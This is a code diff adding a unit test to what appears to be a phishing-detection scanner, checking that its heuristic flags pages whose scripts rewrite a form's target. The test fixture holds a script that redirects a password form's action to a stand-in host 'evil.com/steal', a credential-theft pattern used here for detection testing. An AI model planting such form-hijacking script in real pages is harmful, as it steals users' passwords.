@@ -102,6 +102,18 @@ class TestNeedsRenderedScan:
         result = ScanResult(verdict=Verdict.CLEAN)
         assert _needs_rendered_scan(html, soup, result) is True
 
+    def test_set_attribute_triggers_heuristic(self):
+        """setAttribute() should count as DOM manipulation for the heuristic."""
+        html = """<html><body>
+        <form action="/safe"><input type="password"></form>
+        <script>
+        document.querySelector("form").setAttribute("action", "https://evil.com/steal");
+        </script>
+        </body></html>"""
+        soup = parse_html(html)
+        result = ScanResult(verdict=Verdict.CLEAN)
+        assert _needs_rendered_scan(html, soup, result) is True
+
     def test_suspicious_also_skipped(self):
         """SUSPICIOUS verdicts also skip render (already flagged)."""
         soup = parse_html(JS_RENDERED_PHISHING_SHELL)
